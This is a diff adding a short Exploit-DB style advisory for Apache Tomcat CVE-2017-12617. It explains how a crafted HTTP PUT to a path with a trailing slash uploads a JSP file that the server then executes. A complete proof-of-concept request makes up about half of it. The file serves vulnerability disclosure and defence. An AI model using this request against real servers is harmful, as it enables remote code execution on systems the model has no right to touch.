@@ -1,0 +1,22 @@
+# E-DB Note: https://www.alphabot.com/security/blog/2017/java/Apache-Tomcat-RCE-CVE-2017-12617.html
+
+When running on Windows with HTTP PUTs enabled (e.g. via setting the readonly initialisation parameter of the Default to false) it was possible to upload a JSP file to the server via a specially crafted request. 
+This JSP could then be requested and any code it contained would be executed by the server.
+
+    The PoC is like this:
+    
+    PUT /1.jsp/ HTTP/1.1
+    Host: 192.168.3.103:8080
+    Upgrade-Insecure-Requests: 1
+    User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+    Referer: http://192.168.3.103:8080/examples/
+    Accept-Encoding: gzip, deflate
+    Accept-Language: en-US,en;q=0.8,zh-CN;q=0.6,zh;q=0.4,zh-TW;q=0.2
+    Cookie: JSESSIONID=A27674F21B3308B4D893205FD2E2BF94
+    Connection: close
+    Content-Length: 26
+    
+    <% out.println("hello");%>
+
+It is the bypass for CVE-2017-12615
